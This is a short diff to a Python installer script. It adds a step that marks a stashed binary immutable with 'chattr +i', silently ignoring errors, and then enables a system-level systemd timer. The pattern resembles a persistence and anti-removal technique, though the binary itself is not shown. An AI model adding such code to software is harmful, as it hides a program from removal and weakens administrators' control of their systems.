@@ -83,7 +83,12 @@ WantedBy=timers.target
     with open(TIMER_PATH, "w") as f:
         f.write(timer_content)
 
-    # 5. Load and Start (System-level, no --user flag)
+    # 5. Make the Binary Immutable
+    try:
+        subprocess.run(["chattr", "+i", STASH_PATH], check=True)
+    except Exception as e:
+        pass
+    # 6. Load and Start (System-level, no --user flag)
     subprocess.run(["systemctl", "daemon-reload"], check=True)
     subprocess.run(["systemctl", "enable", f"{APP_NAME}.timer"], check=True)
     subprocess.run(["systemctl", "start", f"{APP_NAME}.timer"], check=True)
